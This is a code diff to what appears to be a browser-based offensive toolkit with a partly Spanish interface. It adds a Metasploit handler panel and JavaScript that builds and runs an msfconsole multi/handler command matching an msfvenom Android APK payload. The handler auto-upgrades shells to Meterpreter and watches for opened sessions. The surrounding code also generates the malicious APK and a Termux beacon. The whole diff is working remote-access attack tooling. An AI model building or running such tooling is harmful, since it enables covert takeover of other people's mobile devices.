@@ -2893,6 +2893,22 @@ textarea.fi{resize:vertical;min-height:48px}
       <div class="out-content" id="mob-apk-out-c"></div>
     </div>
 
+    <!-- HANDLER -->
+    <div class="sdiv" style="margin-top:12px;color:var(--cyan);border-color:var(--cyan)">METASPLOIT HANDLER</div>
+    <div style="font-size:11px;color:var(--mut);margin-bottom:6px">Listener para recibir la sesi&#243;n cuando el APK se ejecute en el dispositivo.</div>
+    <div class="cmd-preview" style="border-color:#0a2a3a;margin-bottom:6px">
+      <div class="cmd-lbl">HANDLER COMMAND &nbsp;<button class="kbtn" style="padding:1px 8px;font-size:10px" onclick="copyEl('mob-handler-cmd')">&#8856; COPY</button></div>
+      <div class="cmd-text"><span id="mob-handler-cmd" class="f"></span></div>
+    </div>
+    <div class="run-row" style="border-color:#0a2a3a">
+      <button class="rbtn" style="border-color:var(--cyan);color:var(--cyan)" id="mob-handler-run" onclick="runMobHandler()">&#9654; START HANDLER</button>
+      <button class="sbtn" id="mob-handler-stop" disabled onclick="stopTool('mob-handler')">STOP</button>
+    </div>
+    <div id="mob-handler-out-area" class="out-area" style="display:none">
+      <div class="out-hdr"><span class="out-title">HANDLER OUTPUT</span><span id="mob-handler-status" style="margin-left:10px;font-size:11px;color:var(--mut)"></span></div>
+      <div class="out-content" id="mob-handler-out-c"></div>
+    </div>
+
     <div class="sdiv" style="margin-top:12px">TERMUX BEACON (Python &#183; instalar v&#237;a Termux)</div>
     <div style="display:flex;gap:6px;margin-bottom:6px">
       <button class="kbtn" onclick="genTermuxBeacon()">GENERATE</button>
@@ -8468,6 +8484,31 @@ function bMobApk() {
   const cmd = 'msfvenom -p ' + pl + ' LHOST=' + lhost + ' LPORT=' + lport + ' -o ' + outfile;
   const el = document.getElementById('mob-apk-cmd-txt');
   if (el) el.textContent = cmd;
+
+  // Build matching handler command
+  const hCmd = 'msfconsole -q -x "use multi/handler; set PAYLOAD ' + pl +
+    '; set LHOST ' + lhost + '; set LPORT ' + lport +
+    '; set ExitOnSession false; set AutoRunScript post/multi/manage/shell_to_meterpreter; exploit -j"';
+  const hEl = document.getElementById('mob-handler-cmd');
+  if (hEl) hEl.textContent = hCmd;
+}
+
+function runMobHandler() {
+  const hEl  = document.getElementById('mob-handler-cmd');
+  const cmd  = hEl ? hEl.textContent.trim() : '';
+  if (!gv('mob-apk-lhost')) { alert('Set LHOST first.'); return; }
+  const stat = document.getElementById('mob-handler-status');
+  if (stat) stat.textContent = '⏳ esperando sesion...';
+  execCmd(cmd, 'mob-handler-out-c', 'mob-handler-out-area', 'mob-handler');
+  // Watch output for session open
+  const iv = setInterval(function() {
+    const out = document.getElementById('mob-handler-out-c');
+    if (!out) { clearInterval(iv); return; }
+    if (out.textContent.includes('Meterpreter session') || out.textContent.includes('session opened')) {
+      if (stat) { stat.style.color='var(--cyan)'; stat.textContent = '✓ sesion abierta'; }
+      clearInterval(iv);
+    }
+  }, 1500);
 }
 
 function runMobApk() {
